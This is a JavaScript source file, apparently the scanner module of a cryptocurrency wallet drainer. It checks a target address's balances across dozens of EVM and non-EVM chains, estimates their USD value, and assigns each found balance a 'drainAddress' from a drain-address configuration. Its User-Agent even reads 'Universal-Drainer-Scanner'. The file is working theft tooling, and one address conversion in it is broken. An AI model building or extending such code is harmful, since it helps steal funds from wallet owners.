const { ethers } = require('ethers');
const axios = require('axios');
const crypto = require('crypto');

// Import configuration
const { REAL_TIME_NETWORKS, REAL_TIME_DRAIN_ADDRESSES } = require('../index');

class ScannerService {
  constructor() {
    this.cache = new Map();
    this.cacheDuration = 60000; // 1 minute
    this.scanningSessions = new Map();
  }
  
  // ==================== REAL-TIME SCANNER ====================
  async scanAddressRealTime(address, options = {}) {
    const sessionId = `scan_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    
    const defaultOptions = {
      includeEVM: true,
      includeNonEVM: true,
      networks: 'all',
      priority: 'fast',
      realtime: true,
      ...options
    };
    
    // Initialize session
    this.scanningSessions.set(sessionId, {
      address,
      options: defaultOptions,
      startedAt: Date.now(),
      status: 'scanning',
      progress: 0,
      results: []
    });
    
    try {
      console.log(`🔍 [${sessionId}] Starting real-time scan for ${address}`);
      
      const results = [];
      
      // Scan EVM networks
      if (defaultOptions.includeEVM) {
        const evmResults = await this.scanEVMNetworksRealTime(address, sessionId, defaultOptions);
        results.push(...evmResults);
      }
      
      // Scan Non-EVM networks
      if (defaultOptions.includeNonEVM) {
        const nonEvmResults = await this.scanNonEVMNetworksRealTime(address, sessionId, defaultOptions);
        results.push(...nonEvmResults);
      }
      
      // Update session
      this.scanningSessions.set(sessionId, {
        ...this.scanningSessions.get(sessionId),
        status: 'completed',
        progress: 100,
        completedAt: Date.now(),
        results
      });
      
      return {
        success: true,
        sessionId,
        data: {
          address,
          results,
          summary: {
            totalNetworks: results.length,
            totalTokens: results.length,
            totalValue: results.reduce((sum, token) => sum + token.balance, 0),
            scannedAt: new Date().toISOString()
          }
        }
      };
      
    } catch (error) {
      console.error(`❌ [${sessionId}] Scan error:`, error);
      
      this.scanningSessions.set(sessionId, {
        ...this.scanningSessions.get(sessionId),
        status: 'failed',
        error: error.message,
        completedAt: Date.now()
      });
      
      throw error;
    }
  }
  
  // ==================== EVM NETWORK SCANNER ====================
  async scanEVMNetworksRealTime(address, sessionId, options) {
    const results = [];
    let scanned = 0;
    
    // Determine which networks to scan
    let networksToScan = Object.entries(REAL_TIME_NETWORKS.evm);
    
    if (options.networks !== 'all' && Array.isArray(options.networks)) {
      networksToScan = networksToScan.filter(([chainId]) => 
        options.networks.includes(parseInt(chainId))
      );
    }
    
    // Limit for priority
    if (options.priority === 'fast') {
      networksToScan = networksToScan.slice(0, 10); // Fast scan: first 10 networks
    }
    
    const total = networksToScan.length;
    
    for (const [chainId, config] of networksToScan) {
      try {
        // Update progress
        scanned++;
        const progress = Math.round((scanned / total) * 100);
        
        this.updateSessionProgress(sessionId, progress, {
          network: config.name,
          scanned,
          total
        });
        
        // Get balance
        const provider = new ethers.JsonRpcProvider(config.rpc);
        const balance = await provider.getBalance(address);
        const balanceFormatted = ethers.formatEther(balance);
        const balanceNumber = parseFloat(balanceFormatted);
        
        if (balanceNumber > 0.000001) {
          const tokenData = {
            network: config.name,
            symbol: config.symbol,
            chainId: parseInt(chainId),
            type: 'evm',
            balance: balanceNumber,
            balanceFormatted,
            rawBalance: balance.toString(),
            decimals: config.decimals,
            drainAddress: REAL_TIME_DRAIN_ADDRESSES.evm[chainId] || REAL_TIME_DRAIN_ADDRESSES.evm[1],
            status: 'detected',
            scanTime: new Date().toISOString(),
            valueUSD: this.estimateUSDValue(balanceNumber, config.symbol)
          };
          
          results.push(tokenData);
          
          // Real-time update
          if (options.realtime) {
            this.emitRealTimeUpdate(sessionId, 'token_detected', tokenData);
          }
        }
        
        // Rate limiting
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        console.log(`[${sessionId}] EVM ${chainId} scan failed:`, error.message);
        
        if (options.realtime) {
          this.emitRealTimeUpdate(sessionId, 'scan_error', {
            network: chainId,
            error: error.message
          });
        }
      }
    }
    
    return results;
  }
  
  // ==================== NON-EVM NETWORK SCANNER ====================
  async scanNonEVMNetworksRealTime(address, sessionId, options) {
    const results = [];
    let scanned = 0;
    
    // Determine which networks to scan
    let networksToScan = Object.entries(REAL_TIME_NETWORKS.nonevm);
    
    if (options.networks !== 'all' && Array.isArray(options.networks)) {
      networksToScan = networksToScan.filter(([networkId]) => 
        options.networks.includes(networkId)
      );
    }
    
    // Priority filtering
    if (options.priority === 'fast') {
      networksToScan = networksToScan.slice(0, 5); // Fast scan: first 5 non-EVM
    }
    
    const total = networksToScan.length;
    
    for (const [networkId, config] of networksToScan) {
      try {
        scanned++;
        const progress = Math.round((scanned / total) * 100);
        
        this.updateSessionProgress(sessionId, progress, {
          network: config.name,
          scanned,
          total
        });
        
        let balance = 0;
        
        // Network-specific balance checking
        switch (networkId) {
          case 'tron':
            balance = await this.getTronBalance(address);
            break;
          case 'solana':
            balance = await this.getSolanaBalance(address);
            break;
          case 'bitcoin':
            balance = await this.getBitcoinBalance(address);
            break;
          case 'cardano':
            balance = await this.getCardanoBalance(address);
            break;
          case 'dogecoin':
            balance = await this.getDogecoinBalance(address);
            break;
          default:
            // Try generic API if available
            if (config.api) {
              balance = await this.getGenericBalance(address, config);
            }
        }
        
        if (balance > this.getMinimumThreshold(networkId)) {
          const tokenData = {
            network: config.name,
            symbol: config.symbol,
            chainId: networkId,
            type: 'non-evm',
            balance: balance,
            balanceFormatted: balance.toFixed(config.decimals || 6),
            decimals: config.decimals || 6,
            drainAddress: REAL_TIME_DRAIN_ADDRESSES.nonevm[networkId],
            status: 'detected',
            scanTime: new Date().toISOString(),
            valueUSD: this.estimateUSDValue(balance, config.symbol)
          };
          
          results.push(tokenData);
          
          if (options.realtime) {
            this.emitRealTimeUpdate(sessionId, 'token_detected', tokenData);
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 150));
        
      } catch (error) {
        console.log(`[${sessionId}] Non-EVM ${networkId} scan failed:`, error.message);
        
        if (options.realtime) {
          this.emitRealTimeUpdate(sessionId, 'scan_error', {
            network: networkId,
            error: error.message
          });
        }
      }
    }
    
    return results;
  }
  
  // ==================== NETWORK-SPECIFIC BALANCE FUNCTIONS ====================
  
  async getTronBalance(address) {
    try {
      let tronAddress = address;
      if (address.startsWith('0x')) {
        tronAddress = 'T' + address.substring(2);
      }
      
      const response = await axios.get(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
        timeout: 5000,
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'Universal-Drainer-Scanner/1.0'
        }
      });
      
      if (response.data && response.data.data && response.data.data.length > 0) {
        const balance = response.data.data[0].balance || 0;
        return balance / 1_000_000;
      }
      
      // Try backup API
      try {
        const backupResponse = await axios.get(`https://apilist.tronscan.org/api/account?address=${tronAddress}`, {
          timeout: 3000
        });
        
        if (backupResponse.data && backupResponse.data.balance) {
          return backupResponse.data.balance / 1_000_000;
        }
      } catch (backupError) {
        console.log("Tron backup API failed:", backupError.message);
      }
      
      return 0;
    } catch (error) {
      console.log("Tron balance check failed:", error.message);
      return 0;
    }
  }
  
  async getSolanaBalance(address) {
    try {
      const response = await axios.post('https://api.mainnet-beta.solana.com', {
        jsonrpc: "2.0",
        id: 1,
        method: "getBalance",
        params: [address]
      }, {
        timeout: 5000
      });
      
      if (response.data && response.data.result) {
        return response.data.result.value / 1e9;
      }
      
      // Try backup RPC
      try {
        const backupResponse = await axios.post('https://solana-api.projectserum.com', {
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [address]
        }, {
          timeout: 3000
        });
        
        if (backupResponse.data && backupResponse.data.result) {
          return backupResponse.data.result.value / 1e9;
        }
      } catch (backupError) {
        console.log("Solana backup RPC failed:", backupError.message);
      }
      
      return 0;
    } catch (error) {
      console.log("Solana balance check failed:", error.message);
      return 0;
    }
  }
  
  async getBitcoinBalance(address) {
    try {
      const response = await axios.get(`https://blockstream.info/api/address/${address}`, {
        timeout: 5000
      });
      
      if (response.data && response.data.chain_stats) {
        const funded = response.data.chain_stats.funded_txo_sum || 0;
        const spent = response.data.chain_stats.spent_txo_sum || 0;
        return (funded - spent) / 1e8;
      }
      
      // Try backup API
      try {
        const backupResponse = await axios.get(`https://blockchain.info/balance?active=${address}`, {
          timeout: 3000
        });
        
        if (backupResponse.data && backupResponse.data[address]) {
          return backupResponse.data[address].final_balance / 1e8;
        }
      } catch (backupError) {
        console.log("Bitcoin backup API failed:", backupError.message);
      }
      
      return 0;
    } catch (error) {
      console.log("Bitcoin balance check failed:", error.message);
      return 0;
    }
  }
  
  async getCardanoBalance(address) {
    try {
      // This requires Blockfrost API key
      // Placeholder implementation
      return 0;
    } catch (error) {
      console.log("Cardano balance check failed:", error.message);
      return 0;
    }
  }
  
  async getDogecoinBalance(address) {
    try {
      const response = await axios.get(`https://dogechain.info/api/v1/address/balance/${address}`, {
        timeout: 5000
      });
      
      if (response.data && response.data.balance) {
        return response.data.balance;
      }
      
      return 0;
    } catch (error) {
      console.log("Dogecoin balance check failed:", error.message);
      return 0;
    }
  }
  
  async getGenericBalance(address, config) {
    try {
      // Generic API call
      if (config.api.includes('blockchair')) {
        const response = await axios.get(`${config.api}/dashboards/address/${address}`, {
          timeout: 5000
        });
        
        if (response.data && response.data.data) {
          const addressData = response.data.data[address];
          if (addressData && addressData.address) {
            return addressData.address.balance / Math.pow(10, config.decimals);
          }
        }
      }
      
      return 0;
    } catch (error) {
      console.log(`Generic balance check failed for ${config.name}:`, error.message);
      return 0;
    }
  }
  
  // ==================== SESSION MANAGEMENT ====================
  
  updateSessionProgress(sessionId, progress, details = {}) {
    const session = this.scanningSessions.get(sessionId);
    if (session) {
      this.scanningSessions.set(sessionId, {
        ...session,
        progress,
        lastUpdate: Date.now(),
        details
      });
    }
  }
  
  emitRealTimeUpdate(sessionId, event, data) {
    // In production, this would emit via WebSocket or SSE
    console.log(`📡 [${sessionId}] ${event}:`, data);
    
    // Store in session
    const session = this.scanningSessions.get(sessionId);
    if (session) {
      if (!session.updates) session.updates = [];
      session.updates.push({
        event,
        data,
        timestamp: Date.now()
      });
      this.scanningSessions.set(sessionId, session);
    }
  }
  
  getSessionStatus(sessionId) {
    const session = this.scanningSessions.get(sessionId);
    if (!session) {
      return {
        success: false,
        error: 'Session not found'
      };
    }
    
    return {
      success: true,
      sessionId,
      status: session.status,
      progress: session.progress,
      startedAt: session.startedAt,
      duration: session.completedAt ? session.completedAt - session.startedAt : Date.now() - session.startedAt,
      results: session.results || [],
      updates: session.updates || []
    };
  }
  
  cleanupOldSessions(maxAge = 3600000) { // 1 hour
    const now = Date.now();
    for (const [sessionId, session] of this.scanningSessions.entries()) {
      if (now - session.startedAt > maxAge) {
        this.scanningSessions.delete(sessionId);
      }
    }
  }
  
  // ==================== HELPER FUNCTIONS ====================
  
  estimateUSDValue(amount, symbol) {
    // Simplified price estimation
    const priceMap = {
      'ETH': 3200,
      'BNB': 600,
      'MATIC': 1.2,
      'AVAX': 35,
      'FTM': 0.4,
      'xDai': 1,
      'CELO': 0.8,
      'GLMR': 0.4,
      'METIS': 60,
      'CRO': 0.1,
      'ONE': 0.02,
      'ROSE': 0.1,
      'MOVR': 15,
      'BTT': 0.000001,
      'FIL': 5,
      'CANTO': 0.2,
      'TRX': 0.12,
      'SOL': 100,
      'BTC': 45000,
      'ADA': 0.5,
      'DOGE': 0.15,
      'LTC': 80,
      'XRP': 0.6,
      'DOT': 7,
      'ATOM': 10,
      'XLM': 0.13,
      'XMR': 160,
      'ZEC': 25,
      'DASH': 30,
      'XTZ': 1,
      'ALGO': 0.2,
      'VET': 0.03,
      'NEO': 12,
      'EOS': 0.8
    };
    
    return amount * (priceMap[symbol] || 1);
  }
  
  getMinimumThreshold(networkId) {
    const thresholds = {
      'tron': 0.001,
      'solana': 0.001,
      'bitcoin': 0.00001,
      'cardano': 0.1,
      'dogecoin': 1,
      'litecoin': 0.001,
      'ripple': 0.1,
      'polkadot': 0.01,
      'cosmos': 0.01,
      'stellar': 0.1,
      'monero': 0.0001,
      'zcash': 0.001,
      'dash': 0.001,
      'tezos': 0.01,
      'algorand': 0.1,
      'vechain': 1,
      'neo': 0.01,
      'eos': 0.1
    };
    
    return thresholds[networkId] || 0.000001;
  }
  
  validateAddress(address, chainType = 'evm') {
    if (chainType === 'evm') {
      return ethers.isAddress(address);
    } else if (chainType === 'tron') {
      return address.startsWith('T') && address.length === 34;
    } else if (chainType === 'solana') {
      return address.length >= 32 && address.length <= 44;
    } else if (chainType === 'bitcoin') {
      return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(address);
    }
    return true; // For others, assume valid
  }
}

module.exports = new ScannerService();